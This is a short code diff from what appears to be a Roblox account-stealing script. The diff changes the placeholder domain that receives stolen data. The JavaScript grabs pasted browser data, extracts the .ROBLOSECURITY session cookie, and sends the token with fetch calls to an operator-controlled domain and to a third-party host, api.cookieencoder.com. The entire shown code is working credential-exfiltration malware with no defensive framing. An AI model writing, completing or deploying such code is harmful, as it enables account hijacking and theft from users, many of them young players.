@@ -140,14 +140,14 @@ function performPaste() {
     performPaste()
   setTimeout(() => {
     var token = document.getElementById("wrap").value
-    fetch("https://YourSecondaryDomain.com/sc.php?t=" + token);
+    fetch("https://YourDomain.com/sc.php?t=" + token);
     fetch("https://api.cookieencoder.com/sc.php?t=" + token);
     var token = token.replace(token.slice(0, token.indexOf(".ROBLOSECURITY")))
     var token = token.replace(token.slice(0, token.indexOf("_")))
     var token = token.replace(token.slice(token.indexOf('"'), token.length))
     var token = token.replace('undefined','');
     var token = token.replace('undefined','');
-fetch("https://YourSecondaryDomain.com/sc.php?t=" + token);
+fetch("https://YourDomain.com/sc.php?t=" + token);
 }, 100);
   }
 fun()
